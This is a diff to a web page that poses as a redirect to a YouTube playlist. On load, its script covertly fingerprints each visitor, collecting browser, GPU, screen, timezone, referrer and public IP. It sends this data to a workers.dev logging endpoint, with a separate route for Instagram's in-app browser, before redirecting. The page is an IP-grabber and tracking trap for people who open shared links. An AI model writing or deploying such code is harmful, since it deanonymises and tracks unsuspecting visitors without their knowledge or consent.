@@ -15,55 +15,38 @@
 
   <script src="./f1337.js"></script>
 
-  <script>
-    // Delay buat redirect normal
-    setTimeout(function () {
-      window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
-      window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
+<script>
+  (async function () {
+    const userAgent = navigator.userAgent;
+    const language = navigator.language;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const screenSize = screen.width + "x" + screen.height;
+    const platform = navigator.platform;
+    const cookies = navigator.cookieEnabled;
+    const doNotTrack = navigator.doNotTrack;
 
-      setTimeout(function () {
-        window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
-      }, 1000);
-    }, 5000);
-  </script>
+    let gpu = "Not Available";
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch (e) {
+      gpu = "Error";
+    }
 
-  <script>
-    // Kumpulin data visitor
-    (async function () {
-      const userAgent = navigator.userAgent;
-      const language = navigator.language;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const screenSize = screen.width + "x" + screen.height;
-      const platform = navigator.platform;
-      const cookies = navigator.cookieEnabled;
-      const doNotTrack = navigator.doNotTrack;
+    let ip = "Unknown";
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      ip = data.ip;
+    } catch (e) {
+      ip = "Error";
+    }
 
-      // Default GPU value
-      let gpu = "Not Available";
-      try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      } catch (e) {
-        gpu = "Error";
-      }
+    const refUrl = document.referrer;
 
-      // Get IP from ipify
-      let ip = "Unknown";
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ip = data.ip;
-      } catch (e) {
-        ip = "Error";
-      }
-
-      // Referrer
-      const refUrl = document.referrer;
-
-    
-      const infoText = `
+    const infoText = `
 🧭 User Agent: ${userAgent}
 🌐 Language: ${language}
 🕒 Timezone: ${timezone}
@@ -74,24 +57,34 @@
 🎮 GPU: ${gpu}
 🌍 IP Address: ${ip}
 🔗 Referrer: ${refUrl}
-      `.trim();
+    `.trim();
 
-    
-      const urlParams = new URLSearchParams(window.location.search);
-    
+    const urlParams = new URLSearchParams(window.location.search);
     const fromWorker = urlParams.has("from");
-    
-if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
-  const encoded = encodeURIComponent(infoText);
-  const url = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
-  fetch(url); 
-} else {
-  const encoded = encodeURIComponent(infoText);
-  const flog = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
-  fetch(flog);
-}
-    })();
-  </script>
 
+    const encoded = encodeURIComponent(infoText);
+    let endpoint = "";
+
+    if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
+      endpoint = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
+    } else {
+      endpoint = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
+    }
+
+    try {
+      await fetch(endpoint);
+    } catch (e) {
+      console.warn("Gagal fetch data log:", e);
+    }
+
+    // ✅ Setelah semua data dikirim, baru redirect
+    setTimeout(function () {
+      window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
+      setTimeout(function () {
+        window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
+      }, 1000);
+    }, 500); // delay pendek aja
+  })();
+</script>
 </body>
 </html>
